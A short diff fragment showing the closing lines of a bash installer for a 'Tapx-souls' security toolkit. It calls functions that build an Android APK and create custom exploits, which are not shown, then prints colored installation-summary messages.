+    log_message "SUCCESS" "Custom exploit scripts created"
+}
+
+# Create Android APK if development tools are available
+if command -v gradle >/dev/null 2>&1; then
+    build_android_apk
+fi
+
+# Create custom exploits and tools
+create_custom_exploits
+
+# Set custom terminal title
+echo -e "\033]0;Tapx-souls Security Terminal\007"
+
+# Display completion summary
+show_banner
+log_message "SUCCESS" "Installation completed!"
+echo -e "${GREEN}Installation Summary:${NC}"
+echo -e "Tools installed: ${GREEN}$TOOLS_INSTALLED${NC}/${TOTAL_TOOLS}"
+echo -e "Log file: ${CYAN}$LOG_FILE${NC}"
+echo -e "${YELLOW}Web interface available at: file://$(pwd)/index.html${NC}"
+echo -e "${PURPLE}App compiler available: ${CYAN}tapx-compiler --help${NC}"
+echo -e "${PURPLE}Compiler directory: ${CYAN}$COMPILER_DIR${NC}"
+echo ""
+echo -e "${PURPLE}Happy hacking with Tapx-souls!${NC}"
